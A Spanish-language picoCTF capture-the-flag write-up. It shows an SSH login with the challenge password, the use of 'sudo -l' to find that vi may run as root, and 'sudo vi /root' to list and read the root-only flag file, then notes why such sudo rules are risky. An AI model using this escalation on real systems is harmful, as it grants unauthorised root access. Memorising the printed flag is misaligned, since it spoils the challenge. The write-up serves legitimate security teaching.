**Reto**
	
**Descripción**
	Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 53719 picoplayer@saturn.picoctf.net`Password: `yX-YQgX-vS`Can you login and read the root file?

**Solución**
	1. Usando terminal de picoCTF
		Lui5-picoctf@webshell:~$ ssh -p 53719 picoplayer@saturn.picoctf.net
		The authenticity of host '[saturn.picoctf.net]:53719 ([13.59.203.175]:53719)' can't be established.
		ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
		This host key is known by the following other names/addresses:
		    ~/.ssh/known_hosts:9: [hashed name]
		Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
		Warning: Permanently added '[saturn.picoctf.net]:53719' (ED25519) to the list of known hosts.
		picoplayer@saturn.picoctf.net's password: 
		Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		This system has been minimized by removing packages and content that are
		not required on a system that users do not log into.
		
		To restore this content, you can run the 'unminimize' command.
		
		The programs included with the Ubuntu system are free software;
		the exact distribution terms for each program are described in the
		individual files in /usr/share/doc/*/copyright.
		
		Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
		applicable law.
		
		picoplayer@challenge:~$ ls ~
		picoplayer@challenge:~$ ls -la
		total 12
		drwxr-xr-x 1 picoplayer picoplayer   20 Feb 20 23:25 .
		drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
		-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
		-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
		drwx------ 2 picoplayer picoplayer   34 Feb 20 23:25 .cache
		-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
		picoplayer@challenge:~$ /root
		-bash: /root: Is a directory
		picoplayer@challenge:~$ cd /root
		-bash: cd: /root: Permission denied
		picoplayer@challenge:~$ sudo -l
		[sudo] password for picoplayer: 
		Matching Defaults entries for picoplayer on challenge:
		    env_reset, mail_badpass,
		    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
		
		User picoplayer may run the following commands on challenge:
		    (ALL) /usr/bin/vi
		picoplayer@challenge:~$ sudo vi /root

			" ============================================================================
			" Netrw Directory Listing                                        (netrw v165)
			"   /root
			"   Sorted by      name
			"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
			"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
			" ==============================================================================
			../                                                                                                             
			./
			.vim/
			.bashrc
			.flag.txt
			.profile
			.viminfo
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			"~/" is a directory     

			picoCTF{uS1ng_v1m_3dit0r_55878b51}
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			~                                                                                                               
			"~/.flag.txt" 1L, 35C     
		
		picoplayer@challenge:~$ 

		picoCTF{uS1ng_v1m_3dit0r_55878b51}

**Notes**
/		1. Análisis del reto:
		El usuario picoplayer no tiene permisos de lectura sobre /root.
		Sin embargo, la configuración de sudoers permite ejecutar el editor de texto vi con privilegios totales.

/		2. Método utilizado:
		Uso de sudo -l para identificar vectores de escalada de privilegios o acceso lateral.
		Uso de un editor de texto con privilegios elevados para saltar la restricción del sistema de archivos.

/		3. Resultados:
		Bandera obtenida: picoCTF{uS1ng_v1m_3dit0r_55878b51}

/		4. Aprendizaje:
		Configuraciones inseguras de sudo: Permitir que un usuario ejecute editores de texto como root es un riesgo crítico, ya que los editores permiten navegar por el sistema y ejecutar comandos internos.

**Referencias**
	